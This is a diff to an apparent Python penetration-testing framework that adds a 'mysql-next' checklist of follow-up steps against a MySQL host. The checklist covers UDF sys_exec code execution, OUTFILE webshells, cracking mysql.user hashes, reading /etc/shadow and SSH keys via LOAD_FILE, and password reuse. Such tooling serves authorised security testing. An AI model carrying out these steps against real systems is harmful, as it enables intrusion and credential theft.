@@ -3386,7 +3386,7 @@ _EXPLOIT_STEPS = {
         ("Root no-pass + default / reused creds; CVE-2012-2122 bypass on old 5.x", "mysql-creds"),
         ("Loot: DBs/users, mysql.user hashes, app creds, LOAD_FILE", "mysql-loot"),
         ("RCE: INTO OUTFILE webshell (FILE priv, exec-verified); UDF guidance", "mysql-rce"),
-        "Manual steps & further research",
+        ("Manual steps & further research", "mysql-next"),
     ],
     "mssql": [
         "Try sa with blank / default, then known creds (impacket mssqlclient / netexec mssql)",
@@ -13044,6 +13044,106 @@ def _tool_mysql_shell(ip: str, port: int, proto: str) -> str:
     return f"mysql-shell: web-rce shell → {lhost}:{lport} (via {url})"
 
 
+# ── MySQL step 5: manual steps & further research (reference only, context-aware) ─
+def _tool_mysql_next(ip: str, port: int, proto: str) -> str:
+    """MySQL step-5 tool: NOT a scan — a read-only checklist of where to go on MySQL, with this
+    host's own findings substituted in (confirmed RCE or creds to spawn, hashes to crack, app creds
+    to reuse, FILE-priv file read/write, phase CVEs, and unconfirmed ⚠ hits). Pure DB synthesis."""
+    scripts = fetch_scripts(ip, port, proto)
+    by_sid = {}
+    for sid, out in scripts:
+        by_sid.setdefault(sid, out or "")
+    banner, loot, rce = by_sid.get("mysql-banner", ""), by_sid.get("mysql-loot", ""), by_sid.get("mysql-rce", "")
+
+    mv = re.search(r"^\[\*\] Service:\s*(.+)$", banner, re.M)
+    ver = mv.group(1).split("·")[0].strip() if mv else ""
+    creds = _gather_mysql_creds(ip)
+    hashes = re.findall(r"^✗ HASH (.+)$", loot, re.M)
+    appcreds = re.findall(r"^✗ CRED (.+)$", loot, re.M)
+    dbs = re.findall(r"^· DB (\S+)", loot, re.M)
+    file_priv = "FILE priv: yes" in loot or "FILE priv: yes" in rce
+    has_rce = "✗ RCE " in rce
+
+    oports = {(p, pr) for p, pr, _s in fetch_ports(ip)}
+    reuse_svc = [n for (pnum, n) in ((22, "SSH"), (445, "SMB"), (21, "FTP"), (5985, "WinRM"))
+                 if (pnum, "tcp") in oports]
+
+    kev = _load_kev()
+    found = set()
+    for (p, pr, _sc, _st, cv, _rk, _sm) in fetch_vulns(ip):
+        if p == port and pr == proto and cv:
+            found |= {c.strip() for c in cv.split(",") if c.strip()}
+    for _sid, out in scripts:
+        found |= set(re.findall(r"CVE-\d{4}-\d{3,7}", out or ""))
+    found = sorted(found, key=_cve_sort_key)
+
+    warns = []
+    for sid, out in scripts:
+        for ln in (out or "").splitlines():
+            if ln.strip().startswith("⚠"):
+                warns.append(f"{DIM}[{sid}]{RESET} {ln.strip()}")
+    warns = warns[:14]
+
+    sub = f"{DIM}version: {ver or 'unknown'}  ·  creds: {len(creds)}  ·  FILE priv: {'yes' if file_priv else 'no'}  ·  RCE: {'yes' if has_rce else 'no'}"
+    L = [f"MySQL {ip} — manual steps {DIM}(reference only — nothing is scanned here){RESET}", sub + RESET]
+
+    L.append(f"\n{BOLD}A. Get code exec{RESET}")
+    if has_rce:
+        L.append(f"  {CYAN}ready{RESET} {DIM}(OUTFILE webshell) → Privilege Escalation phase → spawn-shell (r1){RESET}")
+    elif creds and file_priv:
+        L.append(f"  {DIM}FILE priv + cred → drop an OUTFILE webshell (mysql-rce r4) or UDF sys_exec{RESET}")
+    else:
+        L.append(f"  {DIM}need a FILE-priv cred — prove creds (r2); else no OUTFILE/UDF RCE{RESET}")
+    L.append(f"  {DIM}UDF: INTO DUMPFILE lib_mysqludf_sys.so → @@plugin_dir → CREATE FUNCTION sys_exec "
+             f"SONAME 'lib_mysqludf_sys.so'; mysqld often runs as root → shell as root{RESET}")
+
+    L.append(f"\n{BOLD}B. Crack & reuse{RESET}")
+    if hashes:
+        L.append(f"  {CYAN}{len(hashes)} mysql.user hash(es){RESET} {DIM}→ hashcat -m 300 (native) / -m 7401 (sha2); "
+                 f"cracked → reuse as OS/root creds{RESET}")
+    if appcreds:
+        L.append(f"  {CYAN}app creds:{RESET} {', '.join(a.split(' ')[0] for a in appcreds[:5])}"
+                 + (f" {DIM}+{len(appcreds) - 5}{RESET}" if len(appcreds) > 5 else ""))
+    tgt = ", ".join(reuse_svc) if reuse_svc else "SSH / SMB / web-login"
+    L.append(f"  {DIM}reuse any recovered password on {tgt} (password reuse across the estate){RESET}")
+    if not hashes and not appcreds:
+        L.append(f"  {DIM}nothing looted yet — run mysql-loot (r3){RESET}")
+
+    L.append(f"\n{BOLD}C. File read / write (FILE priv){RESET}")
+    if file_priv:
+        L.append(f"  {CYAN}FILE priv{RESET} {DIM}→ LOAD_FILE('/var/www/.../wp-config.php'), '.env', "
+                 f"'/home/*/.ssh/id_rsa', '/etc/shadow'; INTO OUTFILE to writable paths{RESET}")
+    else:
+        L.append(f"  {DIM}no FILE priv on the current cred — try another user / GRANT via a superuser{RESET}")
+
+    L.append(f"\n{BOLD}D. CVEs surfaced in this phase{RESET}")
+    if found:
+        for c in found:
+            ktag = f"  {RED}KEV{RESET}" if c in kev else ""
+            L.append(f"  {c}{ktag}  {DIM}https://nvd.nist.gov/vuln/detail/{c}{RESET}")
+    else:
+        L.append(f"  {DIM}none surfaced — searchsploit '{ver or 'mysql <version>'}'{RESET}")
+
+    L.append(f"\n{BOLD}E. Loot recap & pivot{RESET}")
+    if dbs:
+        L.append(f"  {CYAN}databases:{RESET} {', '.join(dbs[:8])}"
+                 + (f" {DIM}+{len(dbs) - 8}{RESET}" if len(dbs) > 8 else ""))
+    L.append(f"  {DIM}dump full tables for secrets; connection strings → other DBs/hosts; "
+             f"linked-server / federated hops{RESET}")
+
+    L.append(f"\n{BOLD}F. Verify unconfirmed findings from this phase{RESET}")
+    if warns:
+        for w in warns:
+            L.append(f"  {w}")
+    else:
+        L.append(f"  {DIM}none flagged — nothing sat on the fence{RESET}")
+
+    L.append(f"\n{BOLD}G. Re-run & housekeeping{RESET}")
+    L.append(f"  {DIM}crack the mysql.user hashes then reuse; remove any pshm_*.php webshell dropped by "
+             f"mysql-rce (SQL can't delete — rm on the box){RESET}")
+    return "\n".join(L)
+
+
 # ══ Privilege Escalation phase 1: spawn a shell ══ one place to land a foothold, whatever the
 # service surfaced. A router: it detects which of this host's services have a viable path to a
 # shell (from findings already in the DB) and dispatches to that service's existing foothold tool
@@ -13191,6 +13291,7 @@ _STEP_TOOLS = {
     "mysql-loot": ("dump DBs/users, mysql.user hashes, app creds, LOAD_FILE (mysql CLI, read-only)", _tool_mysql_loot),
     "mysql-rce": ("INTO OUTFILE webshell → exec-verified RCE (FILE priv); UDF guidance", _tool_mysql_rce),
     "mysql-shell": ("MySQL foothold → reverse shell via the OUTFILE webshell (spawned)", _tool_mysql_shell),
+    "mysql-next": ("manual MySQL steps (context-aware, reference only)", _tool_mysql_next),
     "spawn-shell": ("spawn a shell — router across all service footholds (interactive)", _tool_spawn_shell),
 }
 
@@ -13278,6 +13379,7 @@ _STEP_TOOL_RUNS = {
     "mysql-loot":       ("mysql CLI", f"{_mins(_MYSQLLOOT_DEADLINE)} min"),
     "mysql-rce":        ("mysql CLI + HTTP verify", f"{_mins(_MYSQLRCE_DEADLINE)} min"),
     "mysql-shell":      ("Python (smart listener)", None),
+    "mysql-next":       ("reference · no scan", None),
     "spawn-shell":      ("router → service foothold", None),
 }
 
@@ -13357,7 +13459,7 @@ def _run_step_tool(ip: str, target: tuple, n: int) -> None:
         return
     tlabel, runner = _STEP_TOOLS[tool_key]
 
-    if tool_key in ("foothold", "next-steps", "smb-foothold", "smb-next", "winrm-shell", "winrm-next", "ftp-foothold", "ftp-next", "tftp-next", "telnet-next"):  # foreground: interactive / print-now
+    if tool_key in ("foothold", "next-steps", "smb-foothold", "smb-next", "winrm-shell", "winrm-next", "ftp-foothold", "ftp-next", "tftp-next", "telnet-next", "mysql-next"):  # foreground: interactive / print-now
         prev = fetch_step_status(ip, port, proto, key).get(n)
         set_step_status(ip, port, proto, key, n, "running")
         try:
@@ -13366,7 +13468,7 @@ def _run_step_tool(ip: str, target: tuple, n: int) -> None:
             print(f"{RED}✗ {tool_key} error: {exc}{RESET}")
             set_step_status(ip, port, proto, key, n, prev)
             return
-        if tool_key in ("next-steps", "smb-next", "winrm-next", "ftp-next", "tftp-next", "telnet-next"):  # a list to read now, not a scan result
+        if tool_key in ("next-steps", "smb-next", "winrm-next", "ftp-next", "tftp-next", "telnet-next", "mysql-next"):  # a list to read now, not a scan result
             print("\n" + out)
             out = re.sub(r"\x1b\[[0-9;]*m", "", out)           # store clean text (no ANSI) in DETAILS
         save_scripts(ip, [{"id": tool_key, "port": port, "proto": proto, "output": out}])
